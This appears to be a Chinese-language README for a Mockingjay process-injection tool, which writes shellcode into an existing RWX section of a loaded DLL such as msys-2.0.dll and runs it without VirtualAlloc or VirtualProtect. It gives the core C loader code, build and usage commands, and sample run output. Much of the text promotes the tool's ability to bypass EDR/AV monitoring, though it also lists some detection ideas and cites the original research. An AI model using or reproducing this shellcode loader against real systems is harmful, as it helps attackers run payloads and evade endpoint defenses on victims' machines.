# Mockingjay Process Injection

## 概述

**Mockingjay** 是一种利用 DLL 中已存在的 RWX（可读可写可执行）节区进行代码注入的技术。该技术无需调用 `VirtualAlloc`、`VirtualProtect` 等常规内存分配 API，从而绕过基于内存分配的 EDR/AV 检测。

## 技术原理

### 核心思想

某些 DLL（如 `msys-2.0.dll`）包含具有读、写、执行权限的内存节区。Mockingjay 技术利用这些现成的 RWX 节区作为 shellcode 的执行空间。

### 执行流程

```
1. 查找 RWX 节区
   └─> 加载目标 DLL (LoadLibrary)
   └─> 解析 PE 头 (ImageNtHeader)
   └─> 遍历节区 (IMAGE_FIRST_SECTION)
   └─> 检查节区权限 (IMAGE_SCN_MEM_READ | WRITE | EXECUTE)

2. 写入 Shellcode
   └─> 直接使用 memcpy 写入 RWX 节区
   └─> 无需 VirtualAlloc/VirtualProtect

3. 执行 Shellcode
   └─> 将 RWX 节区地址转换为函数指针
   └─> 调用执行
```

### 关键代码

```c
// 查找 RWX 节区
IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);

for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_READ) &&
        (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) &&
        (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {

        LPVOID rwxAddr = (LPVOID)((BYTE*)hModule + sectionHeader->VirtualAddress);

        // 写入 shellcode
        memcpy(rwxAddr, shellcode, shellcodeSize);

        // 执行
        ((void(*)())rwxAddr)();

        break;
    }
    sectionHeader++;
}
```

## 技术优势

### 1. 绕过检测

- ✅ **无内存分配 API**：不使用 `VirtualAlloc`/`VirtualProtect`
- ✅ **无远程写入 API**：不使用 `WriteProcessMemory`
- ✅ **无线程创建 API**：不使用 `CreateRemoteThread`
- ✅ **合法 API 调用**：仅使用 `LoadLibrary`、`memcpy` 等常规函数

### 2. 隐蔽性

- 利用现有内存区域，不分配新的可执行内存
- 绕过基于内存分配行为的启发式检测
- 绕过基于 RWX 内存分配的监控

### 3. 简单高效

- 实现简单，代码量少
- 无需复杂的 PE 解析或重定位
- 执行效率高

## 使用方法

### 编译

```bash
# Windows (MinGW)
build.bat

# 手动编译
gcc -O2 -o rwx_finder.exe src/rwx_finder.c -ldbghelp
gcc -O2 -o mockingjay.exe src/mockingjay.c -ldbghelp -lpsapi
```

### 第一步：查找 RWX 节区

使用 `rwx_finder.exe` 扫描系统中包含 RWX 节区的 DLL：

```cmd
# 扫描 System32
rwx_finder.exe C:\Windows\System32

# 扫描 Program Files
rwx_finder.exe "C:\Program Files"

# 输出示例：
# [+] 发现 RWX 节区：C:\Program Files\Git\usr\bin\msys-2.0.dll
#     节区名：.text    | 虚拟地址：0x00001000 | 大小：327680 字节 | 特性：0xE0000020
```

### 第二步：注入 Shellcode

```cmd
# 使用找到的 DLL 进行注入
mockingjay.exe "C:\Program Files\Git\usr\bin\msys-2.0.dll" payload.bin

# 输出示例：
# [1] 读取 shellcode 文件
#     文件：payload.bin
#     大小：317 字节
#     ✓ Shellcode 读取成功
#
# [2] 加载目标 DLL
#     DLL：C:\Program Files\Git\usr\bin\msys-2.0.dll
#     基地址：0x7FF8A2E40000
#     ✓ DLL 加载成功
#
# [3] 查找 RWX 节区
#     节区名：.text
#     起始地址：0x7FF8A2E41000
#     大小：327680 字节
#     ✓ RWX 节区找到
#
# [4] 写入 shellcode 到 RWX 节区
#     ✓ 成功写入 317 字节到 0x7FF8A2E41000
#
# [5] 执行 shellcode
#     调用地址：0x7FF8A2E41000
#
# ✓ Mockingjay 注入完成
```

## 防御检测

### EDR/AV 绕过

- **内存分配监控**：❌ 无效（不使用 VirtualAlloc）
- **内存保护监控**：❌ 无效（不使用 VirtualProtect）
- **远程注入监控**：❌ 无效（自进程注入）
- **线程创建监控**：❌ 无效（不创建新线程）

### 检测方法

1. **DLL 加载监控**：
   - 监控异常 DLL 加载（如 msys-2.0.dll）
   - 检测非常规路径的 DLL 加载

2. **内存扫描**：
   - 扫描 RWX 内存区域中的可疑代码
   - YARA 规则匹配 shellcode 特征

3. **行为分析**：
   - 监控 `LoadLibrary` 后的异常执行流
   - 检测从 DLL RWX 节区执行的异常行为

## 局限性

1. **依赖特定 DLL**：
   - 需要系统中存在包含 RWX 节区的 DLL
   - 不同系统环境可能缺少合适的 DLL

2. **节区大小限制**：
   - Shellcode 大小受 RWX 节区大小限制
   - 需要提前确认节区是否足够大

3. **DLL 可用性**：
   - 某些系统可能已修补或移除 RWX DLL
   - 需要使用 `rwx_finder.exe` 确认

## 原始研究

- **研究者**：Security Joes
- **发布时间**：2023
- **原始文章**：[Process Mockingjay: Echoing RWX In Userland To Achieve Code Execution](https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution)
- **参考实现**：[caueb/Mockingjay](https://github.com/caueb/Mockingjay)

## MITRE ATT&CK

- **战术**：Privilege Escalation, Defense Evasion
- **技术**：T1055 (Process Injection)
- **子技术**：T1055.001 (Dynamic-link Library Injection)

## 相关技术

- **Module Stomping**：覆盖已加载模块的代码节区
- **Thread Hijacking**：劫持现有线程执行 shellcode
- **Process Hollowing**：替换合法进程映像

## 测试环境

- **操作系统**：Windows 10/11 (x64)
- **编译器**：GCC (MinGW-w64)
- **测试 DLL**：msys-2.0.dll (Git for Windows)

## 免责声明

本技术仅供安全研究和教育目的使用。使用者应遵守当地法律法规，不得用于非法用途。作者不对任何滥用行为负责。
